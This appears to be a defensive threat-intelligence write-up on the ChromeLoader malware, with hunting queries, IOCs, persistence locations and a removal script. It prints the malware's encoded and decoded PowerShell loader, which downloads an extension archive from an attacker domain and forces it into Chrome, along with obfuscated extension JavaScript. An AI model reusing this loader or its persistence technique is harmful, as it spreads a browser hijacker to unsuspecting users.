# Observed malicious IOCs for the CS_installer aka ChromeLoader Malware

### CrowdStrike Query to hunt for ChromeLoader

```
ChromeLoader ScriptContent!=null
| dedup ComputerName
| rex field=ScriptContent "(?<MaliciousDomain>(\$domain = \"[a-zA-Z0-9.]*.))"
| table _time ComputerName ScriptContent MaliciousDomain
```

```
CommandLine="*CS_installer.exe*" FilePath="*CdRom*"
| dedup ComputerName
| table _time ComputerName CommandLine FilePath SHA256HashData
```

### Date of first occurrence

01-03-2022

### Description:

CS_installer/ChromeLoader starts off as an ISO that masquerades as Video Game Cheats/Illegal Software/Freeware.  It was observed that the malicious ISO was downloaded as a zipped archive.  Once downloaded and extracted, the victim runs the ISO on their machine which on Windows 10 or above mounts to disk.  The ISO contains a malicious binary named CS_installer.exe (also seen as setup.exe) and a Win32 API for scheduletask along with configurations files and a symbols file.  Once mounted, the folder containing the malicious binary is locked and will not be removed by the antivirus client.  It requires dismounting of the disk image to release the binary.  Upon execution of the binary `CS_installer.exe`, numerous persistence mechanisms are created and also a Chrome Extension is downloaded and saved to disk.  Once the extension is saved, it extracts the data and installs it into Chrome.    The persistence is configured to execute a PowerShell command that runs a base64 encoded payload which will ensure the ChromeExtension remains on the machine.  It was also observed that the powershell command removes the previously registered scheduled task before creating one again and repeats the Chrome Extension installation process.

### Sample Analysis
https://app.any.run/tasks/bfb74c9f-89d0-4c3b-8c65-233677cdbfc5

### Domains Observed

```
hxxps[://]learnataloukt[.]xyz
hxxps[://]brokenna[.]work
hxxps[://]yflexibilituky[.]co
hxxps[://]ktyouexpec[.]xyz     reported by Twitter user @th3_protoCOL https://twitter.com/th3_protoCOL/status/1480621526764322817
hxxps[://]withyourret[.]xyz    reported by Twitter user @th3_protoCOL https://twitter.com/th3_protoCOL/status/1480621526764322817
```

### Malicious ISO

The Naming convention of the ISOs appear to be targeting young adults.  These names consistenly change each infection it seems.

```
Universal Chat Spammer.iso
Roblox Muscle Legends Script _ AutoFarm + More ....iso
[UPDATED] Bee Swarm Simulator Script GUI _ Hack....iso
This_Young_Maidenhead_Family_Now_Makes_15800_..._1.iso
The Sims 4 [w_ ALL DLC] Free Download.iso
How To Install Shaders For Minecraft 1.18.1_1....iso => reported by reddit user remuchiiee
Twisted Lies by Shandi Boyes.iso
File_ BONEWORKS.v1.6.zip ....iso
```

https://www.virustotal.com/gui/file/fa52844b5b7fcc0192d0822d0099ea52ed1497134a45a2f06670751ef5b33cd3  
https://www.virustotal.com/gui/file/b43767a9b780ba91cc52954aa741be1bddb0905b492e481aea992bca2a0c6a93
https://www.virustotal.com/gui/file/860c1f6f3393014fd84bd29359b4200027274eb6d97ee1a49b61e038d3336372  
https://www.virustotal.com/gui/file/ad68453553a84e03c70106b7c13a483aa9ff1987621084e22067cb1344f52ab7  
https://www.virustotal.com/gui/file/cd999181de69f01ec686f39ccf9a55131a695c55075d530a44f251a8f41da7c8 
https://www.virustotal.com/gui/file/0fb038258bbbc61d4f43cac585ec92c79a9a231bcd265758c23c78f96ac1dbb2  
https://www.virustotal.com/gui/file/3fc00a37c13ee987ec577a8fd2c9daae31ec482c5276208ddff4bc5cb518c2f3  

mounted ISO mainly contains:
```
\Device\CdRom0\CS_INSTALLER.EXE
\Device\CdRom0\CS_installer.exe.config
\Device\CdRom0\CS_installer.pdb
\Device\CdRom0\CS_installer.pdb
\Device\CdRom0\Microsoft.Win32.TaskScheduler.dll
```

### CS_installers

https://www.virustotal.com/gui/file/ded20df574b843aaa3c8e977c2040e1498ae17c12924a19868df5b12dee6dfdd  
https://www.virustotal.com/gui/file/5f57a4495b9ab853b9d2ab7d960734645ebe5765e8df3b778d08f86119e1695c  
https://www.virustotal.com/gui/file/187e08fca3ea9edd8340aaf335bd809a9de7a10b2ac14651ba292f478b56d180 
https://www.virustotal.com/gui/file/1dbe5c2feca1706fafc6f767cc16427a2237ab05d95f94b84c287421ec97c224  
https://www.virustotal.com/gui/file/5c07178b0c44ae71310571b78dde5bbc7dc8ff4675c20d44d5b386dfb4725558  

### Observed behavior

```
Reads hostname
HKEY_LOCAL_MACHINE\SYSTEM\CONTROLSET001\CONTROL\COMPUTERNAME\ACTIVECOMPUTERNAME

OS Credential Dumping
DNSCompatibility.exe

Checks Windows Trust Settings
HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\WINTRUST\TRUSTPROVIDERS\SOFTWARE

Reads settings of System Certificates
HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\SYSTEMCERTIFICATES\DISALLOWED\CERTIFICATES\305F8BD17AA2CBC483A4C41B19A39A0C7
5DA39D6

Checks supported languages
HKEY_LOCAL_MACHINE\SYSTEM\CONTROLSET001\CONTROL\NLS\SORTING\VERSIONS

Environmental Variables
HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION

Checks Windows Installation Data
HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION

Enumeration of Software
DNSCompatibility.exe
```

### Scheduled Task

ChromeLoader could be hardcoded into the binary (CS_installer.exe / Setup.exe) or via standard tasks

![alt text](https://github.com/xephora/Threat-Remediation-Scripts/blob/main/Threat-Track/CS_INSTALLER/images/1.PNG)

![alt text](https://github.com/xephora/Threat-Remediation-Scripts/blob/main/Threat-Track/CS_INSTALLER/images/2.PNG)

### Schedule Task locations

Location 1: C:\windows\system32\tasks\ChromeLoader

```
﻿<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2022-01-08T12:48:01.586-05:00</Date>
    <Description>Example task</Description>
    <URI>\ChromeLoader</URI>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <Repetition>
        <Interval>PT10M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>2022-01-08T12:49:01.55-05:00</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <Duration>PT10M</Duration>
      <WaitTimeout>PT1H</WaitTimeout>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>cmd</Command>
      <Arguments>/c start /min "" powershell -ExecutionPolicy Bypass -WindowStyle Hidden -E JABlAHgAdABQAGEAdABoACAAPQAgACIAJAAoACQAZQBuAHYAOgBMAE8AQwBBAEwAQQBQAFAARABBAFQAQQApAFwAYwBoAHIAbwBtAGUAIgAKACQAYwBvAG4AZgBQAGEAdABoACAAPQAgACIAJABlAHgAdABQAGEAdABoAFwAYwBvAG4AZgAuAGoAcwAiAAoAJABhAHIAYwBoAGkAdgBlAE4AYQBtAGUAIAA9ACAAIgAkACgAJABlAG4AdgA6AEwATwBDAEEATABBAFAAUABEAEEAVABBACkAXABhAHIAYwBoAGkAdgBlAC4AegBpAHAAIgAKACQAdABhAHMAawBOAGEAbQBlACAAPQAgACIAQwBoAHIAbwBtAGUATABvAGEAZABlAHIAIgAKACQAZABvAG0AYQBpAG4AIAA9ACAAIgB5AGYAbABlAHgAaQBiAGkAbABpAHQAdQBrAHkALgBjAG8AIgAKAAoAJABpAHMATwBwAGUAbgAgAD0AIAAwAAoAJABkAGQAIAA9ACAAMAAKACQAdgBlAHIAIAA9ACAAMAAKAAoAKABHAGUAdAAtAFcAbQBpAE8AYgBqAGUAYwB0ACAAVwBpAG4AMwAyAF8AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAdABlAHIAIAAiAG4AYQBtAGUAPQAnAGMAaAByAG8AbQBlAC4AZQB4AGUAJwAiACkAIAB8ACAAUwBlAGwAZQBjAHQALQBPAGIAagBlAGMAdAAgAEMAbwBtAG0AYQBuAGQATABpAG4AZQAgAHwAIABGAG8AcgBFAGEAYwBoAC0ATwBiAGoAZQBjAHQAIAB7AAoACQBpAGYAKAAkAF8AIAAtAE0AYQB0AGMAaAAgACIAbABvAGEAZAAtAGUAeAB0AGUAbgBzAGkAbwBuACIAKQB7AAoACQAJAGIAcgBlAGEAawAKAAkAfQAKAAoACQAkAGkAcwBPAHAAZQBuACAAPQAgADEACgB9AAoACgBpAGYAKAAkAGkAcwBPAHAAZQBuACkAewAKAAoACQBpAGYAKAAtAG4AbwB0ACgAVABlAHMAdAAtAFAAYQB0AGgAIAAtAFAAYQB0AGgAIAAiACQAZQB4AHQAUABhAHQAaAAiACkAKQB7AAoACgAJAAkAdAByAHkAewAKAAkACQAJAHcAZwBlAHQAIAAiAGgAdAB0AHAAcwA6AC8ALwAkAGQAbwBtAGEAaQBuAC8AYQByAGMAaABpAHYAZQAuAHoAaQBwACIAIAAtAG8AdQB0AGYAaQBsAGUAIAAiACQAYQByAGMAaABpAHYAZQBOAGEAbQBlACIACgAJAAkAfQBjAGEAdABjAGgAewAKAAkACQAJAGIAcgBlAGEAawAKAAkACQB9AAoACgAJAAkARQB4AHAAYQBuAGQALQBBAHIAYwBoAGkAdgBlACAALQBMAGkAdABlAHIAYQBsAFAAYQB0AGgAIAAiACQAYQByAGMAaABpAHYAZQBOAGEAbQBlACIAIAAtAEQAZQBzAHQAaQBuAGEAdABpAG8AbgBQAGEAdABoACAAIgAkAGUAeAB0AFAAYQB0AGgAIgAgAC0ARgBvAHIAYwBlAAoACQAJAFIAZQBtAG8AdgBlAC0ASQB0AGUAbQAgAC0AcABhAHQAaAAgACIAJABhAHIAYwBoAGkAdgBlAE4AYQBtAGUAIgAgAC0ARgBvAHIAYwBlAAoACgAJAH0ACgAJAGUAbABzAGUAewAKAAoACQAJAHQAcgB5AHsACgAJAAkACQBpAGYAIAAoAFQAZQBzAHQALQBQAGEAdABoACAALQBQAGEAdABoACAAIgAkAGMAbwBuAGYAUABhAHQAaAAiACkACgAJAAkACQB7AAoACQAJAAkACQAkAGMAbwBuAGYAIAA9ACAARwBlAHQALQBDAG8AbgB0AGUAbgB0ACAALQBQAGEAdABoACAAJABjAG8AbgBmAFAAYQB0AGgACgAJAAkACQAJACQAYwBvAG4AZgAuAFMAcABsAGkAdAAoACIAOwAiACkAIAB8ACAARgBvAHIARQBhAGMAaAAtAE8AYgBqAGUAYwB0ACAAewAKAAkACQAJAAkACQBpAGYAIAAoACQAXwAgAC0ATQBhAHQAYwBoACAAIgBkAGQAIgApAAoACQAJAAkACQAJAHsACgAJAAkACQAJAAkACQAkAGQAZAAgAD0AIAAkAF8ALgBTAHAAbABpAHQAKAAnACIAJwApAFsAMQBdAAoACQAJAAkACQAJAH0AZQBsAHMAZQBpAGYAIAAoACQAXwAgAC0ATQBhAHQAYwBoACAAIgBFAHgAdABlAG4AcwBpAG8AbgBWAGUAcgBzAGkAbwBuACIAKQAKAAkACQAJAAkACQB7AAoACQAJAAkACQAJAAkAJAB2AGUAcgAgAD0AIAAkAF8ALgBTAHAAbABpAHQAKAAnACIAJwApAFsAMQBdAAoACQAJAAkACQAJAH0ACgAJAAkACQAJAH0ACgAJAAkACQB9AAoACQAJAH0AYwBhAHQAYwBoAHsAfQAKAAoACQAJAGkAZgAgACgAJABkAGQAIAAtAGEAbgBkACAAJAB2AGUAcgApAHsACgAKAAoACQAJAAkAdAByAHkAewAKAAoACQAJAAkACQAkAHUAbgAgAD0AIAB3AGcAZQB0ACAAIgBoAHQAdABwAHMAOgAvAC8AJABkAG8AbQBhAGkAbgAvAHUAbgA/AGQAaQBkAD0AJABkAGQAJgB2AGUAcgA9ACQAdgBlAHIAIgAKAAoACQAJAAkACQBpAGYAKAAkAHUAbgAgAC0ATQBhAHQAYwBoACAAIgAkAGQAZAAiACkAewAKAAkACQAJAAkACQBVAG4AcgBlAGcAaQBzAHQAZQByAC0AUwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawAgAC0AVABhAHMAawBOAGEAbQBlACAAIgAkAHQAYQBzAGsATgBhAG0AZQAiACAALQBDAG8AbgBmAGkAcgBtADoAJABmAGEAbABzAGUACgAJAAkACQAJAAkAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBwAGEAdABoACAAIgAkAGUAeAB0AFAAYQB0AGgAIgAgAC0ARgBvAHIAYwBlACAALQBSAGUAYwB1AHIAcwBlAAoACQAJAAkACQB9AAoACgAJAAkACQB9AGMAYQB0AGMAaAB7AH0ACgAKAAkACQAJAHQAcgB5AHsACgAJAAkACQAJAHcAZwBlAHQAIAAiAGgAdAB0AHAAcwA6AC8ALwAkAGQAbwBtAGEAaQBuAC8AYQByAGMAaABpAHYAZQAuAHoAaQBwAD8AZABpAGQAPQAkAGQAZAAmAHYAZQByAD0AJAB2AGUAcgAiAC
```

Location 2: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\TREE\ChromeLoader

```
Property   Type Value                                                                                                                                 
--------   ---- -----                                                                                                                                 
SD       Binary (0x)01,00,04,80,94,00,00,00,b0,00,00,00,00,00,00,00,14,00,00,00,02,00,80,00,04,00,00,00,00,10,18,00,9f,01,1f,00,01,02,00,00,00,00,00,0
                5,20,00,00,00,20,02,00,00,00,10,14,00,9f,01,1f,00,01,01,00,00,00,00,00,05,12,00,00,00,00,10,24,00,ff,01,1f,00,01,05,00,00,00,00,00,05,
                15,00,00,00,79,7b,4c,2a,f0,c4,03,8b,df,0b,88,58,ea,03,00,00,00,00,24,00,89,00,12,00,01,05,00,00,00,00,00,05,15,00,00,00,79,7b,4c,2a,f0
                ,c4,03,8b,df,0b,88,58,ea,03,00,00,00,00,00,00,01,05,00,00,00,00,00,05,15,00,00,00,79,7b,4c,2a,f0,c4,03,8b,df,0b,88,58,ea,03,00,00,01,0
                5,00,00,00,00,00,05,15,00,00,00,79,7b,4c,2a,f0,c4,03,8b,df,0b,88,58,01,02,00,00                                                       
Id       String {95F41003-19E5-4FEF-BC34-BD6B24044329}                                                                                                
Index     DWord 3 
```

Location 3: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{X-X-X-X-X}

(To save you time, you can retrieve the task unique identifier by running the powershell command below)  
`Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\*" | Select-String "ChromeLoader"`

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{53998BBE-E665-4C14-8F9A-5C7B3A0A9392}

Property      Type Value                                                                                                                              
--------      ---- -----                                                                                                                              
Path        String \ChromeLoader                                                                                                                      
Hash        Binary (0x)c7,eb,cd,26,ec,d5,2f,5d,59,55,18,03,21,85,e3,c6,32,dc,05,59,2b,1b,d8,04,dc,3f,8c,74,11,b5,3d,08                                
Schema       DWord 65538                                                                                                                              
Date        String 2022-01-06T13:27:37.271-05:00                                                                                                      
Description String Example task                                                                                                                       
URI         String \ChromeLoader                                                                                                                      
Triggers    Binary (0x)17,00,00,00,00,00,00,00,00,07,01,00,00,00,06,00,80,b8,45,38,2b,03,d8..[TRUNCATION]                                                                        
Actions     Binary (0x)03,00,0c,00,00,00,41,00,75,00,74,00,68,00,6f,00,72,00,66,66..[TRUNCATION]                                                                              
DynamicInfo Binary (0x)03,00,00,00,98,86,ad,14,2b,03,d8,01,aa,f5,5b,ad,52,06,d8,01,..[TRUNCATION] 
```

This was not easy to create, here's a low budget Powershell script to locate and remove ChromeLoader's location 3 persistence mechanism (Thank me later)

- Identify ChromeLoader TaskCache
- Convert object to string
- Clean up to get the exact task UID
- Append task UID to reg path
- Remove regkey with subkeys
- Reboot

```
$result = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\*" | Select-String "ChromeLoader"
$result = $result.ToString()
$taskUID = $result.Split(" ")[11].replace("NT\CurrentVersion\Schedule\TaskCache\Tasks\","").replace(";", "")
$regKeyPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\$taskUID"
Remove-Item -Path $regKeyPath -Recurse
```

### Command of task
```
cmd /c start /min "" powershell -ExecutionPolicy Bypass -WindowStyle Hidden -E <base64EncodedPayload>
```

### Snippet of base64 decoded powershell script

```powershell
$extPath = "$($env:LOCALAPPDATA)\chrome"
$confPath = "$extPath\conf.js"
$archiveName = "$($env:LOCALAPPDATA)\archive.zip"
$taskName = "ChromeLoader"
$domain = "SomeMaliciousDomain"

$isOpen = 0
$dd = 0
$ver = 0

(Get-WmiObject Win32_Process -Filter "name='chrome.exe'") | Select-Object CommandLine | ForEach-Object {
	if($_ -Match "load-extension"){
		break
	}

	$isOpen = 1
}

if($isOpen){

	if(-not(Test-Path -Path "$extPath")){

		try{
			wget "https://$domain/archive.zip" -outfile "$archiveName"
		}catch{
			break
		}

		Expand-Archive -LiteralPath "$archiveName" -DestinationPath "$extPath" -Force
		Remove-Item -path "$archiveName" -Force

	}
	else{

		try{
			if (Test-Path -Path "$confPath")
			{
				$conf = Get-Content -Path $confPath
				$conf.Split(";") | ForEach-Object {
					if ($_ -Match "dd")
					{
						$dd = $_.Split('"')[1]
					}elseif ($_ -Match "ExtensionVersion")
					{
						$ver = $_.Split('"')[1]
					}
				}
			}
		}catch{}

		if ($dd -and $ver){


			try{

				$un = wget "https://$domain/un?did=$dd&ver=$ver"

				if($un -Match "$dd"){
					Unregister-ScheduledTask -TaskName "$taskName" -Confirm:$false
					Remove-Item -path "$extPath" -Force -Recurse
				}

			}catch{}

			try{
				wget "https://$domain/archive.zip?did=$dd&ver=$ver" -outfile "$archiveName"
			}
			catch{}

			if (Test-Path -Path "$archiveName"){
				Expand-Archive -LiteralPath "$archiveName" -DestinationPath "$extPath" -Force
				Remove-Item -path "$archiveName" -Force
			}

		}

	}

	try{
		Get-Process chrome | ForEach-Object { $_.CloseMainWindow() | Out-Null}
		start chrome --load-extension="$extPath", --restore-last-session, --noerrdialogs, --disable-session-crashed-bubble
	}catch{}

}
```

### Dropped Extension location

```
C:\users\<Profile>\appdata\local\chrome
```

### Malicious Extension

```
sha256sum archive.zip
561f219a76e61d113ec002ecc4c42335f072be0f2f23e598f835caba294a3f9b  archive.zip

Contents:
background.js  conf.js  manifest.json  options.png
```

### Sample Extension Configuration
```
cat conf.js

let _ExtnensionName = "Options";
let _ExtensionVersion = "4.0";
let _dd = "MzQ1NDYHAQICAwIGDAEAAgEFAgILBwAMSgoABgYDB0gEAgICAgUHAwAASQ==";
let _ExtDom = "https://krestinaful[.]com/";
let _ExtDomNoSchema = "krestinaful[.]com"
```

### Sample Obfuscated Javascript
```js
cat background.js

T1MM.q3 = (function () {
    var v = 2;
    for (; v !== 9;) {
        switch (v) {
        case 2:
            v = typeof globalThis === 'object' ? 1 : 5;
            break;
        case 1:
            return globalThis;
            break;
        case 5:
            var G;
            try {
                var s = 2;
                for (; s !== 6;) {
                    switch (s) {
                    case 2:
                        Object['defineProperty'](Object['prototype'], 'xbHiy', {
                            'get': function () {
                                var J = 2;
                                for (; J !== 1;) {
                                    switch (J) {
                                    case 2:
                                        return this;
                                        break;
                                    }
                                }
                            },
                            'configurable': true
                        });
                        G = xbHiy;
                        s = 5;
                        break;
                    case 5:
                        G['QQr8M'] = G;
                        s = 4;
                        break;
                    case 4:
                        s = typeof QQr8M === 'undefined' ? 3 : 9;
                        break;
                    case 9:
                        delete G['QQr8M'];
                        var N = Object['prototype'];
                        delete N['xbHiy'];
                        s = 6;
                        break;
                    case 3:
                        throw "";
                        s = 9;
                        break;
                    }
                }
            } catch (l) {
                G = window;
            }
            return G;
            break;
        }
    }
})();
T1MM.A1MM = A1MM;
e7(T1MM.q3);
[TRUNCATION..]
```

### Raw Obfuscated javascript

```javascript
U0MM.i5=(function(){var A=2;for(;A !== 9;){switch(A){case 5:var h;try{var m=2;for(;m !== 6;){switch(m){case 2:Object['\x64\x65\x66\u0069\u006e\u0065\x50\u0072\u006f\u0070\u0065\u0072\x74\u0079'](Object['\x70\x72\u006f\x74\u006f\u0074\x79\u0070\x65'],'\u0070\x6c\x71\u0074\x74',{'\x67\x65\x74':function(){var O=2;for(;O !== 1;){switch(O){case 2:return this;break;}}},'\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x62\x6c\x65':true});h=plqtt;h['\u006e\u0034\u0072\x75\u0030']=h;m=4;break;case 9:delete h['\x6e\u0034\x72\x75\u0030'];var s=Object['\x70\x72\x6f\x74\x6f\x74\u0079\u0070\u0065'];delete s['\x70\u006c\u0071\u0074\x74'];m=6;break;case 3:throw "";m=9;break;case 4:m=typeof n4ru0 === '\x75\u006e\u0064\u0065\u0066\u0069\u006e\u0065\x64'?3:9;break;}}}catch(D){h=window;}return h;break;case 1:return globalThis;break;case 2:A=typeof globalThis === '\u006f\u0062\x6a\x65\u0063\x74'?1:5;break;}}})();U0MM.u0MM=u0MM;X4(U0MM.i5);U0MM.n6=(function(){var r6=2;for(;r6 !== 5;){switch(r6){case 2:var I7={P7:(function(u7){var e6=2;for(;e6 !== 10;){switch(e6){case 2:var S7=function(R7){var T6=2;for(;T6 !== 13;){switch(T6){case 3:Y7++;T6=5;break;case 9:var h7,F7;T6=8;break;case 8:h7=f7.j0gg(function(){var U6=2;for(;U6 !== 1;){switch(U6){case 2:return 0.5 - D0gg.X0gg();break;}}}).G0gg('');F7=U0MM[h7];T6=6;break;case 14:return F7;break;case 4:f7.a0gg(A0gg.k0gg(R7[Y7] + 41));T6=3;break;case 5:T6=Y7 < R7.length?4:9;break;case 1:var Y7=0;T6=5;break;case 2:var f7=[];T6=1;break;case 6:T6=!F7?8:14;break;}}};var g7='',D7=m0gg(S7([76,7,36,36])());e6=5;break;case 8:g7+=A0gg.k0gg(D7.H0gg(k7) ^ u7.H0gg(i7));e6=7;break;case 5:var k7=0,i7=0;e6=4;break;case 6:g7=g7.s0gg('%');var p7=0;var q7=function(L6){var V6=2;for(;V6 !== 19;){switch(V6){case 12:V6=p7 === 5 && L6 === 38?11:10;break;case 11:g7.x0gg.l0gg(g7,g7.N0gg(-4,4).N0gg(0,2));V6=5;break;case 10:I7.P7=N7;V6=20;break;case 1:g7.x0gg.l0gg(g7,g7.N0gg(-10,10).N0gg(0,8));V6=5;break;case 13:g7.x0gg.l0gg(g7,g7.N0gg(-6,6).N0gg(0,5));V6=5;break;case 9:V6=p7 === 2 && L6 === 27?8:7;break;case 2:V6=p7 === 0 && L6 === 92?1:4;break;case 6:g7.x0gg.l0gg(g7,g7.N0gg(-3,3).N0gg(0,1));V6=5;break;case 20:return N7(L6);break;case 14:V6=p7 === 4 && L6 === 42?13:12;break;case 4:V6=p7 === 1 && L6 === 68?3:9;break;case 7:V6=p7 === 3 && L6 === 61?6:14;break;case 3:g7.x0gg.l0gg(g7,g7.N0gg(-3,3).N0gg(0,1));V6=5;break;case 5:return p7++;break;case 8:g7.x0gg.l0gg(g7,g7.N0gg(-4,4).N0gg(0,2));V6=5;break;}}};e6=12;break;case 9:i7=0;e6=8;break;case 12:var N7=function(Q6){var M6=2;for(;M6 !== 1;){switch(M6){case 2:return g7[Q6];break;}}};return q7;break;case 4:e6=k7 < D7.length?3:6;break;case 7:(k7++,i7++);e6=4;break;case 3:e6=i7 === u7.length?9:8;break;}}})('BS%6G2')};return I7;break;}}})();U0MM.P6=function(){return typeof U0MM.n6.P7 === 'function'?U0MM.n6.P7.apply(U0MM.n6,arguments):U0MM.n6.P7;};U0MM.I6=function(){return typeof U0MM.n6.P7 === 'function'?U0MM.n6.P7.apply(U0MM.n6,arguments):U0MM.n6.P7;};function X4(W8){function n5(A8){var y2=2;for(;y2 !== 5;){switch(y2){case 2:var o8=[arguments];return o8[0][0].Function;break;}}}function t5(e8){var k2=2;for(;k2 !== 5;){switch(k2){case 2:var T8=[arguments];return T8[0][0].Math;break;}}}function A5(r8){var q2=2;for(;q2 !== 5;){switch(q2){case 2:var m8=[arguments];return m8[0][0].Array;break;}}}function e5(Z8){var T2=2;for(;T2 !== 5;){switch(T2){case 2:var N8=[arguments];return N8[0][0].String;break;}}}var x8=2;for(;x8 !== 83;){switch(x8){case 50:h8[39]+=h8[23];h8[26]=h8[6];h8[26]+=h8[23];h8[26]+=h8[23];h8[16]=h8[5];h8[16]+=h8[72];h8[16]+=h8[2];x8=64;break;case 42:h8[62]=h8[35];h8[62]+=h8[23];h8[62]+=h8[23];h8[25]=h8[42];h8[25]+=h8[24];h8[25]+=h8[23];h8[28]=h8[30];x8=54;break;case 69:Z5(e5,"fromCharCode",h8[58],h8[50]);x8=68;break;case 2:var h8=[arguments];h8[1]="";h8[1]="A";h8[3]="";h8[3]="k0";x8=9;break;case 87:Z5(e5,"split",h8[32],h8[25]);x8=86;break;case 14:h8[7]="D";h8[5]="";h8[5]="X";h8[6]="G0";h8[4]="";x8=20;break;case 86:Z5(A5,"unshift",h8[32],h8[62]);x8=85;break;case 15:h8[30]="H0";h8[24]="0g";h8[42]="s";h8[23]="";x8=24;break;case 84:Z5(A5,"splice",h8[32],h8[46]);x8=83;break;case 70:Z5(r5,"String",h8[58],h8[57]);x8=69;break;case 64:h8[56]=h8[7];h8[56]+=h8[72];h8[56]+=h8[2];h8[17]=h8[8];x8=60;break;case 68:Z5(A5,"sort",h8[32],h8[17]);x8=67;break;case 9:h8[9]="a";h8[8]="";h8[8]="j";h8[7]="";x8=14;break;case 71:Z5(A5,"push",h8[32],h8[34]);x8=70;break;case 72:var Z5=function(y8,F8,z8,l8){var k8=2;for(;k8 !== 5;){switch(k8){case 2:var J8=[arguments];k5(h8[0][0],J8[0][0],J8[0][1],J8[0][2],J8[0][3]);k8=5;break;}}};x8=71;break;case 29:h8[46]+=h8[23];h8[77]=h8[89];h8[77]+=h8[72];h8[77]+=h8[2];x8=42;break;case 35:h8[32]=9;h8[32]=1;h8[58]=5;h8[58]=0;h8[46]=h8[36];h8[46]+=h8[23];x8=29;break;case 20:h8[4]="m";h8[2]="";h8[2]="gg";h8[89]="l";h8[35]="x0";x8=15;break;case 90:Z5(A5,"join",h8[32],h8[26]);x8=89;break;case 85:Z5(n5,"apply",h8[32],h8[77]);x8=84;break;case 54:h8[28]+=h8[23];h8[28]+=h8[23];h8[39]=h8[4];h8[39]+=h8[24];x8=50;break;case 60:h8[17]+=h8[72];h8[17]+=h8[2];h8[50]=h8[3];h8[50]+=h8[23];x8=56;break;case 56:h8[50]+=h8[23];h8[57]=h8[1];h8[57]+=h8[72];h8[57]+=h8[2];x8=75;break;case 24:h8[72]="0";h8[23]="";h8[23]="g";h8[36]="N0";x8=35;break;case 66:Z5(t5,"random",h8[58],h8[16]);x8=90;break;case 89:Z5(r5,"decodeURI",h8[58],h8[39]);x8=88;break;case 88:Z5(e5,"charCodeAt",h8[32],h8[28]);x8=87;break;case 75:h8[34]=h8[9];h8[34]+=h8[72];h8[34]+=h8[2];x8=72;break;case 67:Z5(r5,"Math",h8[58],h8[56]);x8=66;break;}}function r5(P8){var n8=2;for(;n8 !== 5;){switch(n8){case 2:var v8=[arguments];return v8[0][0];break;}}}function k5(L8,E8,D8,q8,C8){var t8=2;for(;t8 !== 13;){switch(t8){case 6:O8[7]=false;try{var G2=2;for(;G2 !== 6;){switch(G2){case 2:O8[5]={};O8[1]=(1,O8[0][1])(O8[0][0]);O8[8]=[O8[1],O8[1].prototype][O8[0][3]];O8[8][O8[0][4]]=O8[8][O8[0][2]];G2=3;break;case 3:O8[5].set=function(i8){var S2=2;for(;S2 !== 5;){switch(S2){case 2:var b8=[arguments];O8[8][O8[0][2]]=b8[0][0];S2=5;break;}}};O8[5].get=function(){var v2=2;for(;v2 !== 13;){switch(v2){case 6:s8[2]+=s8[3];return typeof O8[8][O8[0][2]] == s8[2]?undefined:O8[8][O8[0][2]];break;case 3:s8[8]="";s8[8]="un";s8[2]=s8[8];s8[2]+=s8[1];v2=6;break;case 2:var s8=[arguments];s8[3]="";s8[3]="ed";s8[1]="defin";v2=3;break;}}};O8[5].enumerable=O8[7];try{var o2=2;for(;o2 !== 3;){switch(o2){case 2:O8[9]=O8[6];O8[9]+=O8[4];O8[9]+=O8[2];o2=4;break;case 4:O8[0][0].Object[O8[9]](O8[8],O8[0][4],O8[5]);o2=3;break;}}}catch(h6){}G2=6;break;}}}catch(v6){}t8=13;break;case 3:O8[4]="o";O8[6]="";O8[6]="definePr";O8[7]=true;t8=6;break;case 2:var O8=[arguments];O8[2]="";O8[2]="";O8[2]="perty";t8=3;break;}}}}function U0MM(){}var y01111=+"2";for(;y01111 !== "13" << 64;){switch(y01111){case +"2":y01111=U0MM.I6("92" >> 0) === +"40"?+"1":"5" - 0;break;case +"9":U0MM.i6="1" >> 32;y01111="8" >> 32;break;case +"14":U0MM.d6=+"26";y01111=+"13";break;case +"4":U0MM.p6="80" - 0;y01111=+"3";break;case +"8":y01111=U0MM.I6("61" - 0) > U0MM.P6(+"42")?+"7":"6" * 1;break;case +"1":U0MM.g6="35" * 1;y01111=+"5";break;case +"7":U0MM.J6="86" ^ 